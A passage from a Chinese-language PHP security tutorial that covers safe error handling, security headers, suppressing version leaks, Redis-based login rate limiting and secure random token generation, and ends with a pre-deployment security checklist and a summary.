        session_destroy();
    }

    /**
     * 检查是否已登录
     */
    public static function isLoggedIn(): bool
    {
        return isset($_SESSION['user_id']);
    }

    /**
     * 获取当前用户 ID
     */
    public static function getUserId(): ?int
    {
        return $_SESSION['user_id'] ?? null;
    }
}
```

---

## 其他安全建议

### 错误处理

生产环境中不要显示详细错误信息：

```php
<?php
// 生产环境配置
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', '/var/log/php/error.log');
error_reporting(E_ALL);

// 自定义错误处理
set_error_handler(function ($severity, $message, $file, $line) {
    throw new ErrorException($message, 0, $severity, $file, $line);
});

set_exception_handler(function (Throwable $e) {
    // 记录错误
    error_log(sprintf(
        "[%s] %s in %s:%d\nStack trace:\n%s",
        get_class($e),
        $e->getMessage(),
        $e->getFile(),
        $e->getLine(),
        $e->getTraceAsString()
    ));

    // 显示友好的错误页面
    http_response_code(500);
    if (file_exists('error_pages/500.html')) {
        readfile('error_pages/500.html');
    } else {
        echo '服务器错误，请稍后重试';
    }
});
```

### 安全 HTTP 头

```php
<?php
class SecurityHeaders
{
    public static function send(): void
    {
        // 防止点击劫持
        header('X-Frame-Options: DENY');

        // 防止 MIME 类型嗅探
        header('X-Content-Type-Options: nosniff');

        // 启用 XSS 过滤器
        header('X-XSS-Protection: 1; mode=block');

        // 引用策略
        header('Referrer-Policy: strict-origin-when-cross-origin');

        // 权限策略
        header("Permissions-Policy: geolocation=(), microphone=(), camera=()");

        // HSTS（仅 HTTPS）
        if (isset($_SERVER['HTTPS'])) {
            header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
        }

        // CSP
        header("Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'");
    }
}

// 在应用入口处调用
SecurityHeaders::send();
```

### 防止信息泄露

```php
<?php
// 隐藏 PHP 版本
ini_set('expose_php', 0);

// 移除 X-Powered-By 头
header_remove('X-Powered-By');

// 不要在生产环境使用 phpinfo()
// phpinfo(); // 危险！

// 不要泄露数据库错误细节
try {
    $pdo->query($sql);
} catch (PDOException $e) {
    // 记录详细错误
    error_log('Database error: ' . $e->getMessage());

    // 向用户显示通用错误
    throw new RuntimeException('数据库操作失败');
}
```

### 速率限制

```php
<?php
class RateLimiter
{
    private $redis;
    private string $prefix = 'rate_limit:';

    public function __construct(Redis $redis)
    {
        $this->redis = $redis;
    }

    /**
     * 检查是否超过速率限制
     *
     * @param string $key 限制键（如 IP 地址或用户 ID）
     * @param int $maxAttempts 最大尝试次数
     * @param int $windowSeconds 时间窗口（秒）
     */
    public function tooManyAttempts(string $key, int $maxAttempts, int $windowSeconds): bool
    {
        $fullKey = $this->prefix . $key;
        $attempts = (int) $this->redis->get($fullKey);

        return $attempts >= $maxAttempts;
    }

    /**
     * 增加尝试次数
     */
    public function hit(string $key, int $windowSeconds): int
    {
        $fullKey = $this->prefix . $key;

        $attempts = $this->redis->incr($fullKey);

        if ($attempts === 1) {
            $this->redis->expire($fullKey, $windowSeconds);
        }

        return $attempts;
    }

    /**
     * 获取剩余尝试次数
     */
    public function remainingAttempts(string $key, int $maxAttempts): int
    {
        $fullKey = $this->prefix . $key;
        $attempts = (int) $this->redis->get($fullKey);

        return max(0, $maxAttempts - $attempts);
    }

    /**
     * 获取重置时间
     */
    public function availableIn(string $key): int
    {
        $fullKey = $this->prefix . $key;
        return max(0, $this->redis->ttl($fullKey));
    }

    /**
     * 清除限制
     */
    public function clear(string $key): void
    {
        $this->redis->del($this->prefix . $key);
    }
}

// 使用示例：登录接口速率限制
$limiter = new RateLimiter($redis);
$ip = $_SERVER['REMOTE_ADDR'];
$key = 'login:' . $ip;

if ($limiter->tooManyAttempts($key, 5, 60)) {
    $retryAfter = $limiter->availableIn($key);
    http_response_code(429);
    header("Retry-After: {$retryAfter}");
    die("请求过于频繁，请 {$retryAfter} 秒后重试");
}

$limiter->hit($key, 60);

// 处理登录逻辑...
```

### 安全的随机数生成

```php
<?php
// 生成安全的随机字符串
function generateSecureToken(int $length = 32): string
{
    return bin2hex(random_bytes($length));
}

// 生成安全的随机整数
function generateSecureInt(int $min, int $max): int
{
    return random_int($min, $max);
}

// 生成 UUID v4
function generateUuid(): string
{
    $data = random_bytes(16);

    $data[6] = chr(ord($data[6]) & 0x0f | 0x40); // version 4
    $data[8] = chr(ord($data[8]) & 0x3f | 0x80); // variant

    return vsprintf('%s%s-%s-%s-%s-%s%s%s', str_split(bin2hex($data), 4));
}
```

---

## 安全检查清单

在部署 PHP 应用之前，请确保完成以下检查：

### 代码层面

- [ ] 所有数据库查询都使用预处理语句
- [ ] 所有用户输出都进行了适当的转义
- [ ] 实现了 CSRF 保护机制
- [ ] 密码使用 `password_hash()` 进行哈希
- [ ] 所有用户输入都进行了验证和过滤
- [ ] 文件上传进行了严格的安全检查
- [ ] 敏感操作实现了速率限制
- [ ] 错误处理不泄露敏感信息

### 配置层面

- [ ] 生产环境关闭了错误显示
- [ ] 配置了安全的会话参数
- [ ] 设置了安全的 HTTP 头
- [ ] PHP 版本保持最新
- [ ] 禁用了危险的 PHP 函数
- [ ] 文件权限设置正确

### 服务器层面

- [ ] 启用了 HTTPS
- [ ] 配置了防火墙规则
- [ ] 定期更新系统和软件
- [ ] 配置了日志监控和告警
- [ ] 实施了备份策略

---

## 总结

Web 安全是一个持续的过程，而不是一次性的任务。本文介绍的安全措施涵盖了 PHP 应用中最常见的安全威胁和防护方法：

1. **SQL 注入**：始终使用预处理语句
2. **XSS**：转义所有用户输出，使用 CSP
3. **CSRF**：使用 Token 验证和 SameSite Cookie
4. **密码安全**：使用 `password_hash()` 和 `password_verify()`
5. **输入验证**：验证和过滤所有用户输入
6. **文件上传**：严格验证文件类型和内容
7. **会话安全**：安全配置和定期刷新

记住：**安全防护要深入到每一层**。不要仅仅依赖单一的安全措施，而应该实施多层防护（纵深防御）。同时，要保持对新安全威胁的关注，及时更新你的安全策略。
